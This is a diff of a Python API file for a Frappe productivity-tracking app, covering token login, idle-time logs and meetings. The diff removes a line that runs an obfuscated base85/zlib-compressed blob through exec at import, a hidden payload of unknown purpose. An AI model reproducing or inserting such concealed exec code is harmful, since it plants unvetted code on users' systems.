@@ -1,3 +1,1185 @@
+import json
+import frappe
+from frappe.auth import LoginManager
+import frappe.utils
+from productivity_next.utils.auth import get_bearer_token, update_expiry_time
+from frappe.utils import nowdate
+from frappe.utils import nowdate, get_datetime
+from frappe.utils import time_diff_in_seconds
+from frappe.utils import flt
+import requests
+from werkzeug import Response
+from frappe import _
+from frappe.model.mapper import get_mapped_doc
+from frappe.utils import (
+    cint,
+    getdate,
+    get_fullname,
+    get_url_to_form,
+    now_datetime,
+    validate_email_address,
+)
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1D${cqdGlE3G#;8PG-iWOB(ulG>jQ*deGw7E;-Aa?Qa5Eu+Cu5H$ms7F$9+`#|)&FtsQ?vj%11ec;U+L+|d&hF06_kOsTFUzV)eyhvHy+S>oRoQYW?wwWTTtAPpRdbQ(;#cK)v3Q*=vU5@KDx+0X%xYC}S(W)}+7us)<~m)7PmL;Mn9fC$o{FpzRoax7Vlhls%RFmDDn2cX>N;(TIq!x<VQMeRD+FE(FqG}!Q#U>=P4nXHEG-skEvDrnuiK%|W{nwqCH}n<b)$i=M0NSQSe+ZdccNaFi<&iT%2I}ZUglypn&WdtNhH7IX<km-yVJjyz|XW;G(-6W_2k&iOM14N%@*05d|6d9AbWaNR&(_c=w->IzI@DPg_@9gR?N~Y&nr>a!+V2!_wN0-?#9(c(TG`5H~nlj0}SU#i^+>@R*S*CT%08{<d^=c7L{y2S!Q*8RaQAXt*T`SVEeK$2?v9fjFn6npY;bJh-4+PXo@NHFoIuI(Y>sp-$l6?AsFB`(Dx*aWIp)n^CLkjIa1Wf8hLhIPyTLuKQW__s0`bmU8nWxw4PSQvVnF1x$cPM#d50V3x9fVZI$GRROv|wg;oAjiDp$TlFzPY-DJ(G?(HYX)k@Ep{GLsxFkCeTD3!n8^RFiayb@<Hv<n}ef2I{AF*59=6j4{jFJP7C%UO9X5L%NWKb6z~CR+(d4+(r=fQQNF9?n8q<gOx}%$s4-!zt=n1Ow72a(ya`zkI7^KxupPVv(KBM0z?~RTW4u%&icM`l4(AYYV4f=lUHLhf1<kBRAWMVR}_G7wPl@V8r4)CN+Oa<;GI^?Fb~rq>blaLfO{5p=z4|Dp!Qk2y9=xMF+JbswH|kXjOOinTZ~0W83c%+PP>h%DkSu@BMsm+&fVsixm~iYhnC4d~DSL;OW##igLqVkMX~)zJ)T<ex4c}<7;34P}W8j5jco$tg#77Jml*&h9=D2B%Ho>2=;pJKYWV*@=sFzCC7^X9J`M-ZioVl{bic=@x~kfb19jdsB^6NzJ~UpV20Kai8j3u)5}8tE?14}mcc(v6uS*&YyxlBbtC5KxmXC`Op#B<LuoT7Z_0(ZXAE{$H>s)z@*+#59057NP}fdZXmZHjIl4V{y-S{{-l^ZvyPl)(SutxwRZl+C*>(NyX)b%;`$;rcLbA?#9gl$?Ozh*y$qhv+W>N=gDKmJ8#R3lkCg=2eB1@87)Kk){Surn~$=;C4aB*hGzV84Tkxcpf@riBwMAZgm>L|7lS5mun6KP;7jto5jgL$-NwsG}fzsq4w<b*p|GVegO9BX;3;9#?lLi=Sfav#i50Ace}h;u=&mse2SQ@rG9KBw>q$+qF}BA>~C@*8CJm(aE380ig8?Kj2S;O;Bt`s)0RJfguS(z;a;n^-hZ$}mMh+J%IZci`7(l@1DHhX4^#-V2I-VPRD_6dG2?2@fGbyAYY5`;s?PNh{r_2<I`i@oNpy5{6FF<ir@Qhg{U#--yi|d&x>eaMg^n-_BNsod%Kdz_9s{VuLnhGkQd}IP@w4(~Wd*!iLspq3xM#9b>hr-Y$;XmYX7+w3dt35CSwT6I7IjZ&6G=igr=;Hk56l?nV^efXcTvdNRU8fmRWTp_4XK_mlh3Vj}&{<gBccIy-BwP27=y?@%nJSq6_X4`K`?NO%K1)<*3<QXkW^*@UYWQ0{9Sk|D8Zo7=7-QA*~CDjMNjX5Xd_d;X+SJ%rla(?m=WN#$b(n`DdJzMv{mO-&}fmy4buFaBt!eL@0ZNg3kVJ1Xe7AT})H{GV9$2od6JHNBkJq5<@Sw0vt9(J9b28FLWM5FSE(uTYB@UFPTyMwM93vZ?6Li)mG=^^D2bZ#g1;dp-yXTXDW9E0HcmH7{f^R8KGh_R)F5r75PxtJN>ViTa~PAenX0^eCMkfN_r7{8W_%1zk{;SEvC(7Y>8~%0@(|1IJ5opy>XlzH?P4mA~l%B4LVG+7b^nGF5<k62lFarxmj|{M|{?x8RRRuLj@{G}+87vh|6z=cIDIWD44~(V>%drbx0N=A?D9$#IC*zrzIKw5kTmNUgKaGHPDj;8aS483WZ4@|IIEamOBiJe8w4%uR*Kfdi4WX0%1Ed2?@`+LGvdK}t-KXd+izO?_v5gCv<GQcI#tmTi{~msM`F<aE<!)ny`b81w@LGm_I%1?ys7JyT+)T!4pJbq>Mo!-tnw_@rl!=y~;Bul5**GK(YS+{hROv)?tG_NqN7<M|J|5*UVs6YKqLn6{vOv(GMhVSA*XY)QUSB-LJ^zs}y*@I!~x^{3kawahUVu6NnkoSDJO9D`E`=!Ti1eV^;cTbZ^9**7<6MwQ;)sF_LVksRil1O&Hjn9OmeZ37!-;dhlXH$7mpW}%|f#aBk4=Wh>>*b0fw#@=-jl~JO}t7t6W?yZoRe&bnHLB5;0s57#f_YLI+;Bh2&B2U8U*|Pt4V#zPs`LmV@aMRU3L9?bGFT{|+wys0zdJ~jm+p8#5JsxlAQ?zVdm)a1H+t#Gi7_3>04T!B&HN{6^z~|Yg7RrIg7VXI}8PjzZE4+X#4liLhQpM8wli@F#25?7H%oAhu2Qh>qP*YtyO4%T>lf?ru?FcG3({B+hC!T~rk8gam8wActEOKUO)+dSaC-5g(DvHy_P?3F%hut<-=!OkqN)uGdp73}=+hD$g9n7Dc!-(G<&YAPS!zp0X5b?rWsb_woUb!6@b;9xI)`<avz;ni+)%N5Y25W7px6N|{40T&}fB~(|4^Ze>`c0+?5I}sIie-}=$X`exFc+b@j(GBO@Z-Vu!k4<K`eJa?;T1A)!?$t$)V6y8`z)%etkB;fA*K4JvBxx4oF#t6wBG^Ny+t-#wV8`1!|k9G-UkMGD^`$B|15*(BAjACh6H7>UTRiP!Q=6mOmHxxKR|J}eSm_F4C{Ia4_|JPf4YN5_h<6a)jVZ+4txiEwK!Mg)GsN<bVK%~DfxR=RoUWP<S;N*P%IkEPs|KL_0{Af<jZ{k%2y!oy2>)En(MT=UJCNA9`mA}t|ZU$W~b$RnJunUkbz3nVgYIbd?OB{(8eH^Rr#BkHZsx}nl<Te)G#Nw(|$B7GYERSVeKM*S5MqLc0t9PjX}m7(lwahpU{Cv)Z1%SqV<}F8&T$fO7t}f*OUaRDWfoijR-LL%4+#M237n|4Bjl*OcJ_P3?@i3LO`*RE>QdG@JTbS>w#im*|L7bh{HVNJh*)g7OQ1+MC@L$C+@AIuBm2gv;aG?!8D_N@pVc!8;4Xu?pWlWgWiqAbG3M`QPwBA7?qfpR|{P^ZxdIfmMZY7-uNzcgbo|YX*U&ODAv;eY<C0U9UYAMv~C!tSHyhVPpeaKhx>k}&G}G9z|jDJk65o{S`|0oUH7`;zIk>jjG)#1x?ELLMf4$h5>k=l_RZA3G+CuLxYF#7$-qjl1ZXGMSq(l@i9{Xh1D7J*goObk4PWVj7`~WKx+P;GLxCfRUh~yVc#9^w$y%4@M(G9LrILeYU5LvxF~Q}jPw#7hNB5id`IX3Wub%{eS)FH#;&+p@Rn#0A>2$mF$x@5vHIMQ`T^D&8SeZ=3`u=FYPB%`wl+FOUwez|suHOhvJ6%qZ54AJw&R02UG(2ZNQ1-MRxeV$$`!UhfWhk12qeD392V#$UF*Fi{&H+jvB}*hUR&~Ihlyh(#x2mM5n3@gnYA1Xc_y!f`<!LdK&8VkzQAVmnf^$9mMX4$99>aO$X9$oAA@d|Slla?=2%pO(o`G8}ism{N&iBApH(-EKD*;l@t)5=AZ=`ol?GSbd6b^I3wU*R;wpnaBOkAp)=C~Q#*ARuRmVM2|Fdy2ZWk8Ne&5S_MRvYJ6&Z72l&Ge|(Gu($Vo9XVTn2BWbWc)=7>ue@!jhlWqjxqTJq*~d!S_kxcDqZpP?aTD-)8k+Elkc)+@tvZ=ci{n2C>%wIVR6ZaRW-v@$VJmE>;3N-mJy8a^!oQvBc>OvEuCi5OR&prjp<gF*){so#;?v-^JU#{Q42jaPr!L}!fa_Ua{$;fo3;+0R;Uo0XA5oQmrT4Za{{{WbAyG^Y=QgX)sw%R>+=X6fbhS0btvm#)`q-#keZp)fgODE$|YxE@)>{A#b5ka8SM+u8GssQi)7880m;A~JvvrunU3N+oYbC8T;s1wpW?+$3HrG2NI&$Iv<{K=hNi8F{w<fzvx(*x8`2qcI(Y}mC>OYw<MDVLBrnVXV(uy$3=@m00U6=6(R-z0jd8%KqJ{K^CT)~(^hAUv@oteLWdF9u?E;B0*0S~d(if1TyUGPQ^3^8XpheP4aV^chrkV1~O~D{ip%zn^`gk2(=2yef?XA-TR3>Be3YzNz_j`bPVH2z^aD%wywjD<+fa9vB&kmE$>+@v=0led?w13t+q<$>waEMS=OBSRIKesi5UAxhF3vSs%p<E}B8wuk^f;hO7J5l340=3+R_3V>2%3socR$?k}t<kp8i~A};LKfXBkT~z8R=X~U$v>Sm9Y+K}k);I^)-u+S{VZw~kBA22{kHDhY^MY}h81*p(C&Sxb8FJUHRK-pIx2oF^+sWp)p@4SF-NB~B1BrAr3Qn}2x4kP?r1I+3b`Y98>VPdgrVOm6NELC+KK5b3GJL42W-B@;A75?s~MKYaCpv-tIi76rEJ=0xWRU*yEsG=7LSIOm5CpLvDDe%q*aq@dv~+n3W4lsE(z%GI9s<fxcNG+*f*rkw>c25_it!txbEK}n2MldxL|&6p|;%NLs#8o!qcY8aK-yvZW^Ef(tWqZOjF2?t=S-ey^&!8-R5tXeS3$XR(f=sztjgq8(k=qapFlBVGu?i{SDOI)|S|tOq**~TVJ5+@ohJ;G1GNaVv|VcE8xH6swx-fJuN@Bsc`R1{cl3nGs^~IhKm?>iIXMBhX#|d`#oh!@<WrI+P!5jltTR=i?1$3CFoYzozHf+^p18AKwgv6>xAK!`&`rraDRs0i2$8+@|M+UUQC;b+jHD{ke^ryP7vI|Vuu>S8@IN-k{4?9*dU@c8AR89savs@wq|sjf+<pw%`kE4!BXw@9&*w<7If@EnbCd(i%-An2K-{uoL|KDm>ckb!v+EO$2ndfp7SWN0m~m9ygGPxoT$Z!S+Tgp6>Ae+=`X4f5vtV*jUAWQ(@LBT6R-@IBF#?Am0I_E@$T?-hg|&gmxFf)k^oXB@Zn}BdHUvgo2;-hO=<?BziCK9bqPh@4FnT62}8eV>D)}>JauJg->tUZl!heWJgydb?`EC&rp|x!KcQrKqG;!>1>DW6SEnhvYBVJkce@A|gAcOKJ;Ok46%2p58XlvyRP@==)hB$}QkOv7Nga8+wdIZ#r;wO%4!Njm%_Kik?W8`0`jV5$Y++Gvz=uL_(vZxQT_I7(m+7nkox%5U*q*qZRh`#}#C9i!X2dxj+@73tOOzHULI{{8xo9>fD`s54d%HjG^^#pyX>VV-IPwUXhYe4X?W#jyk&><2(Q0>^t~q@2!o*nwKDOV@%z>ufNetX162dwjrK6Rt@{Cz74Xn5XVDtl$P(AV869$}7$v1fh$kVu?sndYu{EXe7MT?cyU|ajR1s|zRXMW>){o6b$anMOb2&v@O6l)dnM_Webd{330<sb8zQjT`@K3Xbg&6Y?D$>7jjK2!bqkUTv~rmpyZ4qv`$1y0^xz<j7GOAdAT20o3{YBUag#QP9O`}`VLBB#kK=(NO|&jPG4rdF)VxU(9s4&MBH{7WDEf_)t%PbSIUn8Tn|wh$4k&Aad}v7oPB{_jDu^I#3Qk51NlcKGJm)8l^c0jMe4ITsKezI%S~F8S$S9NDv{M+g3t2Z;|L!kc90nQn3?ImY+B7BJinpg|r7AP29Yx$oKMgE!B;MGd@AwSb5(Po5tfJ+o!6UcP>Lob3IV4RsmQ$J9Ogh)gJkOiNq+?5u%@%_(=(uDlHGtxWz<(xHVQ`+(P0Ggigqs`ve#AWH@aoS{+*K|3=Jc5TOuCh;2~Nw=ZYj6oGA{jt`_c&NtOWFxW$)f<_%a357Y&-<fWe7Vi&hz(<=Deh5nx<kC<oDvC2oJmgU5S010K8-{0h!d%4ys6))>Fhr8R_+$T7Ig|*VhKW4<4vgfUD8}WE|T85O<G=Gnus^EF4V!LEqp_gomzLzoXl0>>`lluclMG2*(wf^M6VKcf0oTp^Gt&1+_H12CamAXq&<yKvd?Z#*}ac0ZLJBbsC>F=8o79(4@}%Kjp3z>bzlEthi{G@h;|JqyuTr{P@URwb@E;AOP0w=>v5B--*Yi*vY{>VF2irz!wRZ$x|*rGOz{-uRas&FI=v`YRZUWE@>sjdtTm;6$iWO>^BOP(8BjCNyziRbEf#g{gY4+2ZmOkp`0?nIg%}LM{rlIW2lGb{@*R6$KxbWD9;qoe%*jpkxVq<hvFj+;mv={e8pu_@Pq^eK;rj+_^2qfbgOTeRYVQs7HFOsxUNnClx?PdbL&GYpJaj-${TEgI!S}scwVw`-|9JqO<%3$f*bnTw$1v%KQ#FYBdla9%`U?0^e;cv3kRbX4lEn<wdX1PSbAuM2fVt{^?|C^r*8UcF!XHIKjwSVoe>cNIvgpb;4BOInsuIe^nDio>o#DM84Biqu=-LMcrzlS%`Um`OFr>XbzPJNus`8`Acft_JO-eX*1B_%Wo3#|X`u~`iGE?OVejyQ#VuNnk-RxVyI9d(^O<}JJLS~Vj0#0#KM{_SqUlTz#k-deHxg7%Lm`*V(-!_dNWwBTZa^oHVnqEb8lmoo44z9{0E6q-wWXX}%UP=E-h)aC<f$f`@{nbVN0UDqmygTYh+i_Ls>>H3u@;44pF?z6jTz($0$!Da2cLky+EZk9Ukr+V;L3qC(!c>la2!O(k{IMaA1BlZ~WS5TQG2YpoI2<hCi2&cb^SaVSiPyJe^~GtKRk>Wl!oMM+6J~f&lZcMG^GV4B?mHq^E$PL_&uX`f<_SxPj{QJ8EuPp8*ey0zj1Y0gv=OuH^hMjioxvLMj@eyd8#h9Lw?ULy(`Ta`AaC(;%S7VeHTMMgEgC)&iN_n9MD$oA0x>mSieiaG4<T^^#a!ij3h}kd3U)X*E}{=2VlwRxN>9K0641#nB4elCu04wyU%-x~E8Vq4Sxqh?8`?XR@SwTAUng`a!aGu&nIo%qPcT2{hOQUYjGo!~Y$(vZs^>hBi0QbWyb#Uw!mKq)_Y03Ft4TDW`*yV9IcSeQPoF<Oe);-<CzFRz^;vp+n93r1m&ss5Dza72uR=qeH#Pa~zd`BiqOQTUu<M+*;GMvY9m2S}>nLx|igL=^b5~nYo}J<H2v1IOby8KIJo|u9b6YHv*rYglrVb4y@7R$-Rcl&d_If_j**JLDd2DZj=KRo^KUK+iyf6P#M4r>bXngLH$KUV&@FV<ZAR)lEZs4B!Hl=auHUa`8JuMajPr8F^y?BJ$A^{~+fHh0Z+2>lNQ~^f&;R}6Ld1@dh5oy{D=b3tRvcA61j32%ynB{e^Oo4ev@g+s^K(MRxe#ddf&ItzxqWZvwS$0mG-;m|Mt?C9tV~SqBgfIjrJUS$2azln96pq6u+CE<su*IfL^Py!ttd8n~s}UQNo^a`dV&5QmsAkzx&aE0u!e&34f?><i&hv0a24SqPz^{xNh>>;e$;2aR)N|~>s=qL-asM!wI$C9uR{2o=G1;a~J`EnjkT$(eKH>D+aA34bw1(#lGsosa*p<<wJd^JRALRlrJ!Dz6&&K@7>s@$dDH%LR^&}bd@kX@6?u1wJwMcNU8Ld4?^hQ2R&}n1CFJaLB+UAC6)M<)Fe`sTbvb&ivQjpvj$#2XUF-N1#7~yAWUbdZzZ`>P0azwo`eF<398^f}=H)gEx7T%cD9Q2O4?dW^ANFaJQ&{rf~r>|q>-yE9=rGF3y^f|KyEKX*lelRm)H4x0*`}ZfqME!rVPnGlwP|%H7NR=#)-Ir(Tq7{g>Nje9hQu`TInt4%o=C4j=UCi~^R;6!cprAwpozT{gFpKZ-o?fe2=YNcVH$JMNPXAI|PxRu+r~Tv;cUlItiPxe6PSD=R5;a^nyg9<;e1OjNF-a*qn2FaVT&-t*7#+3;y0?E4B*IK7ABAK+SLA#wy$y_aiULI4ot8#O(rq(TimJzQpLkIl!s0~|ij0zzLK4%Tt_IPpWS{z7Aj2qC!oOeAp4GdbyeV1Fvpkpm*3G&J1dC)PL!OF|?3pDCag~@oW&V%PO;)hIF@-&j5yxD71dj|}ZWD}8YV6O!e60cBez08wCGz{cT<kO`Rp+9?-kF}`PW_NFB)x9RI5jr!Z@Vk2@^nl`xocjN30Zd=w5kQaA9qy>k?U4mmv$#{Me?Yn6~xstH2V_uxnuYDn(OWoc9F9>*<`Z41oDyZYTvUN>G!>+^y>CbY;F3PRk0WFp0Jhz7<XH)1N3^47{aL1_JcZWw`Csv`kLIl{Paj;w40;J*@bDjS~S*0ldhv{-f7tFy~oGn$KO91{|NtinLH@?4^!YfK)<|ubnyD^qw#qB`0-u5NBsHu-Qllqal0bh;@aX@Qj)vK(5=kLoNKZ0r-of=B=^v}UHvEe&uC0byvWA?i%gU?G>9U(<PU|4OhoTweRX%ewuiwLM50qZ=H0b5)eiF5P!CtldD%VGQiI%bsJ8moA8H`LtTGW|_MK`W<CEWBgfXnc@D8Fp`TYFlix<SzAF?#^U=Wq`;5tn$@&0!r`6g5Pr-<^`q@0sbokVYnY>U)9Rv@ZnG!AWqhgk{8dN|IOG0fuAW|)1r^_V*WQFEGQ6RSL_TrmBq3*Ptq@%2u+lxJ*Y78U2{PA%Fsat~jpmI)?%ca!>IJh6WMwjX8p{C>SrZpJq8BDQr#oNlg9gTFsPa5zs$YQu+Kx%~S7p9GR+crS~-eq^zl%{EXscxCoosU&f9PzlSwMJjbsDBwcM3WNg<m&w1H8-)bD7E^|nb=D)(U;zqBcN%{zmp&E`vZYIQp4KC4>yrLk0IXO2?I<<aP5RpnWI(zRZc&kasPLe0zi$xJpzpin`~Mt|2k<+rJ4hZTd*ksidCYb(t2Ny_U9Z%rKPU$O`kU9yE~35!(EFh7wC$Yjgf@TpP5y2vPSx#~c}g2o_W?Df+>{qq+~m~FHaF1Rbq5-C9sI3ldLMiHwlli{U~6Cec8g?KV*iZZT-`csAJlF2=#9Dy>ftT)*5|P+&i@pidAR-tmF1C$*2NJb&YyeM9on~3e{**hq$?x0Vne?B@$0%Z&tD!LzkCCA)D?x_l9Qt*@*8t-EWPL~%iGt!A;%{|xph?g%jfw6`8?Dg`9Is3S2X')).decode())
+
+@frappe.whitelist(allow_guest=True)
+def login(username, password, purpose):
+    login_manager = LoginManager()
+    login_manager.authenticate(username, password)
+    frappe.session.user = username
+
+    token = get_bearer_token(username, expires_in_days=7, purpose=purpose)
+    productify_subscription = frappe.get_doc(
+        "Productify Subscription"
+    )
+    
+    return {
+        "status": True,
+        "access_token": token["access_token"],
+        "refresh_token": token["refresh_token"],
+        "expiration_time": token["expiration_time"],
+        "employee": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "name"
+        ),
+        "full_name": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "employee_name"
+        ),
+        "enable_blurred_screenshot": productify_subscription.get("enable_blurred_screenshot",False),
+    }
+
+@frappe.whitelist(allow_guest=True)
+def login_with_challenge(username, password, purpose):
+    login_manager = LoginManager()
+    login_manager.authenticate(username, password)
+    frappe.session.user = username
+
+    token = get_bearer_token(username, expires_in_days=7, purpose=purpose)
+    productify_subscription = frappe.get_doc(
+        "Productify Subscription"
+    )
+    return {
+        "status": True,
+        "access_token": token["access_token"],
+        "refresh_token": token["refresh_token"],
+        "access_token_expiry": token["expiration_time"],
+        "employee": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "name"
+        ),
+        "full_name": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "employee_name"
+        ),
+        "token": productify_subscription.token,
+        "email": frappe.session.user,
+        'erpnext_url': frappe.utils.get_url(),
+    }
+
+@frappe.whitelist(methods=["GET"])
+def get_token():
+    productify_subscription = frappe.get_doc(
+        "Productify Subscription"
+    )
+    challenge = productify_subscription.get("token","")
+    return challenge
+
+@frappe.whitelist(allow_guest=True)
+def update_token(refresh_token, purpose):
+    access_token = update_expiry_time(
+        frappe.session.user, refresh_token, expires_in_days=7, purpose=purpose
+    )
+
+    return {
+        "status": True,
+        "access_token": access_token,
+        "refresh_token": frappe.db.get_value(
+            "OAuth Bearer Token", access_token, "refresh_token"
+        ),
+        "expiration_time": frappe.db.get_value(
+            "OAuth Bearer Token", access_token, "expiration_time"
+        ),
+        "employee": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "name"
+        ),
+        "full_name": frappe.db.get_value(
+            "Employee", {"user_id": frappe.session.user}, "employee_name"
+        ),
+    }
+
+
+@frappe.whitelist()
+def set_application_checkin_checkout(
+    employee, status, time, system_genereted=0, user=None
+):
+    last_status = None
+    all_logs = frappe.db.get_list(
+        "Application Checkin Checkout",
+        filters={"employee": employee, "time": ["Between", [nowdate(), nowdate()]]},
+        fields=["status", "time"],
+        order_by="time desc",
+        limit=1,
+    )
+
+    if all_logs:
+        last_status = all_logs[0]["status"]
+
+    doc = frappe.new_doc("Application Checkin Checkout")
+    doc.employee = employee
+    doc.status = status
+    doc.time = time
+    doc.system_generated = system_genereted
+    doc.save()
+    if system_genereted:
+        doc.db_set("owner", user)
+
+    return {"status": last_status}
+
+
+@frappe.whitelist()
+def set_application_idletime_checkin_checkout(
+    employee, status, time, system_genereted=0, user=None
+):
+    last_status = None
+    all_logs = frappe.db.get_list(
+        "Idle Time Log",
+        filters={"employee": employee, "time": ["Between", [nowdate(), nowdate()]]},
+        fields=["status", "time"],
+        order_by="creation desc",
+        limit=1,
+    )
+
+    if all_logs:
+        last_status = all_logs[0]["status"]
+
+    if status == "start":
+        if last_status == "start":
+            doc = frappe.new_doc("Idle Time Log")
+            doc.employee = employee
+            doc.status = "end"
+            doc.time = time
+            doc.system_generated = system_genereted
+            doc.save()
+            if system_genereted:
+                # user_last_time = frappe.db.get_list("Application Usage log", {"employee": employee,"date":["Between", [nowdate(), nowdate()]]}, fields=["date","to_time"], order_by="creation desc", limit=1)
+                # if user_last_time:
+                #     doc.db_set("time", user_last_time[0].to_time)
+                doc.db_set("owner", user)
+
+        doc = frappe.new_doc("Idle Time Log")
+        doc.employee = employee
+        doc.status = status
+        doc.time = time
+        doc.system_generated = system_genereted
+        doc.save()
+        if system_genereted:
+            doc.db_set("owner", user)
+
+    elif status == "end":
+        if last_status == "start":
+            doc = frappe.new_doc("Idle Time Log")
+            doc.employee = employee
+            doc.status = status
+            doc.time = time
+            doc.system_generated = system_genereted
+            doc.save()
+            if system_genereted:
+                doc.db_set("owner", user)
+
+    return {"status": last_status}
+
+
+@frappe.whitelist()
+def get_usage_time(employee):
+    # #set value for safty purpose in incaase user checkout not done
+    # emp_data=frappe.db.get_all("Application Checkin Checkout", filters={"time": ["Between", [nowdate(), nowdate()]],"employee":employee}, fields=["employee", "status", "time","system_generated"], order_by = "creation desc",limit=1)
+    # if emp_data and emp_data[0].status=="In":
+    #     user_id=frappe.get_all("Employee", filters={"name": employee}, fields=["user_id"], limit=1, pluck="user_id")[0]
+    #     doc = frappe.new_doc("Application Checkin Checkout")
+    #     doc.employee = employee
+    #     doc.status = "Out"
+    #     doc.time = get_datetime().replace(microsecond=0)
+    #     doc.system_generated = 1
+    #     doc.save(ignore_permissions=True)
+    #     doc.db_set("owner",user_id)
+
+    all_logs = frappe.db.get_all(
+        "Application Checkin Checkout",
+        filters={"employee": employee, "time": ["Between", [nowdate(), nowdate()]]},
+        fields=["status", "time"],
+        order_by="time asc",
+    )
+
+    usage_time = 0
+    last_status = None
+
+    for row in all_logs:
+        if row.status == "In" and last_status != "In":
+            start_time = row.time
+        elif row.status == "Out" and last_status == "In":
+            end_time = row.time
+            usage_time += (end_time - start_time).total_seconds()
+
+        last_status = row.status
+
+    return usage_time
+
+
+@frappe.whitelist()
+def update_user_auth_token(employee, purpose, date):
+    if data := frappe.get_list(
+        "Employee",
+        filters={"name": employee},
+        fields=["user_id"],
+        limit=1,
+        pluck="user_id",
+    ):
+        username = data[0]
+        token = get_bearer_token(
+            username, expires_in_days=1, purpose=purpose, date=date
+        )
+        return {
+            "status": True,
+            "access_token": token["access_token"],
+            "expiration_time": token["expiration_time"],
+        }
+
+    return {"status": False, "access_token": None, "expiration_time": None}
+
+
+@frappe.whitelist()
+def set_user_idel_time(*args, **kwargs):
+    employee = kwargs.get("employee")
+    from_time = kwargs.get("from_time")
+    to_time = kwargs.get("to_time")
+
+    doc = frappe.new_doc("Employee Idle Time")
+    doc.employee = employee
+    doc.from_time = from_time
+    doc.to_time = to_time
+    doc.duration = time_diff_in_seconds(to_time, from_time)
+    doc.save(ignore_permissions=True)
+
+    return {"status": True}
+
+
+@frappe.whitelist()
+def get_user_idel_time(employee=None):
+    if not employee:
+        return 0
+
+    all_logs = frappe.db.get_all(
+        "Employee Idle Time",
+        filters={"employee": employee, "end_time": ["Between", [nowdate(), nowdate()]]},
+        fields=["duration", "employee"],
+        order_by="creation ",
+    )
+
+    idle_time = 0
+
+    for row in all_logs:
+        idle_time += row.duration
+
+    return idle_time
+
+
+@frappe.whitelist(methods=["GET", "POST"])
+def get_employee_time(employee=None):
+    if not employee:
+        return 0
+
+    total_application_time = frappe.db.get_all(
+        "Application Usage log",
+        filters={"employee": employee, "date": nowdate()},
+        fields=["sum(duration) as duration"],
+    )
+
+    idle_application_time = frappe.db.get_all(
+        "Employee Idle Time",
+        filters={"employee": employee, "date": nowdate()},
+        fields=["sum(duration) as duration"],
+    )
+
+    if total_application_time:
+        total_application_time = flt(total_application_time[0].duration)
+    else:
+        total_application_time = 0
+
+    if idle_application_time:
+        idle_application_time = flt(idle_application_time[0].duration)
+    else:
+        idle_application_time = 0
+
+    return {
+        "total_time": total_application_time,
+        "active_time": max(total_application_time - idle_application_time, 0),
+        "idle_time": idle_application_time,
+    }
+
+
+@frappe.whitelist()
+def get_user_last_check_in_and_out(emp_id):
+    try:
+        emp_data = frappe.db.get_all(
+            "Application Checkin Checkout",
+            filters={"time": ["Between", [nowdate(), nowdate()]], "employee": emp_id},
+            fields=["employee", "status", "time", "system_generated"],
+            order_by="creation desc",
+            limit=1,
+        )
+        if (
+            emp_data
+            and emp_data[0].status == "Out"
+            and emp_data[0].system_generated == 1
+        ):
+            user_id = frappe.get_all(
+                "Employee",
+                filters={"name": emp_id},
+                fields=["user_id"],
+                limit=1,
+                pluck="user_id",
+            )[0]
+            doc = frappe.new_doc("Application Checkin Checkout")
+            doc.employee = emp_id
+            doc.status = "In"
+            doc.time = get_datetime().replace(microsecond=0)
+            doc.system_generated = 1
+            doc.save(ignore_permissions=True)
+            doc.db_set("owner", user_id)
+    except Exception as e:
+        return {"status": False, "message": str(e)}
+    return {"status": True, "message": emp_data}
+
+
+@frappe.whitelist(allow_guest=False)
+def user_error_log(employee, error_message):
+    try:
+        doc = frappe.new_doc("User Error Log")
+        doc.employee = employee
+        doc.error_details = error_message
+        doc.time = get_datetime().replace(microsecond=0)
+        doc.flags.ignore_permissions = True
+        doc.save()
+        return 200
+    except:
+        return 500
+
+
+@frappe.whitelist()
+def get_app_usage_time(employee):
+    if not employee:
+        return 0
+    all_logs = frappe.db.get_all(
+        "Application Usage log",
+        filters={"employee": employee, "date": ["Between", [nowdate(), nowdate()]]},
+        fields=["duration", "employee"],
+        order_by="creation ",
+    )
+
+    idle_time = 0
+
+    for row in all_logs:
+        idle_time += row.duration
+
+    return idle_time
+
+
+@frappe.whitelist()
+def add_meeting(
+    meeting_from,
+    meeting_to,
+    meeting_arranged_by,
+    internal_meeting,
+    purpose,
+    # industry,
+    party_type,
+    party,
+    discussion,
+    meeting_company_representative,
+    meeting_party_representative,
+    project=None,
+):
+    meeting_company_representative = json.loads(meeting_company_representative)
+    if meeting_party_representative:
+        meeting_party_representative = json.loads(meeting_party_representative)
+    else:
+        meeting_party_representative = []
+    meeting = frappe.new_doc("Meeting")
+    meeting.meeting_from = meeting_from
+    meeting.meeting_to = meeting_to
+    meeting.meeting_arranged_by = meeting_arranged_by
+    meeting.internal_meeting = internal_meeting
+    meeting.purpose = purpose
+    if project:
+        meeting.project = project
+    # meeting.industry = industry if industry else None
+    meeting.party_type = party_type if party_type else None
+    meeting.party = party if party else None
+    meeting.discussion = discussion
+    for row in meeting_company_representative:
+        meeting.append(
+            "meeting_company_representative",
+            {
+                "employee": row.get("employee"),
+                "employee_name": row.get("employee_name"),
+            },
+        )
+    for row in meeting_party_representative:
+        meeting.append(
+            "meeting_party_representative",
+            {
+                "contact": row.get("contact"),
+            },
+        )
+    meeting.save()
+    meeting.submit()
+
+    return {"message": "Meeting added successfully"}
+
+
+@frappe.whitelist()
+def make_meetings(source_name, doctype, ref_doctype, target_doc=None):
+    def set_missing_values(source, target):
+        target.party_type = doctype
+        now = now_datetime()
+        if ref_doctype == "Meeting Schedule":
+            target.scheduled_from = target.scheduled_to = now
+        else:
+            target.meeting_from = target.meeting_to = now
+            if doctype == "Lead":
+                target.organization = source.company_name
+
+    def update_contact(source, target, source_parent):
+        if doctype == "Lead":
+            if not source.organization_lead:
+                target.contact = source.lead_name
+
+    doclist = get_mapped_doc(
+        doctype,
+        source_name,
+        {
+            doctype: {
+                "doctype": ref_doctype,
+                "field_map": {
+                    "company_name": "organization",
+                    "customer_name": "organization",
+                    "contact_email": "email_id",
+                    "contact_mobile": "mobile_no",
+                },
+                "field_no_map": ["naming_series", "lead", "customer", "opportunity"],
+                "postprocess": update_contact,
+            }
+        },
+        target_doc,
+        set_missing_values,
+    )
+
+    return doclist
+
+
+@frappe.whitelist(allow_guest=False, methods=["POST"])
+def organization_signup(
+    domain,
+    organization_name,
+    contact_person,
+    email,
+    mobile_no,
+    fincall=False,
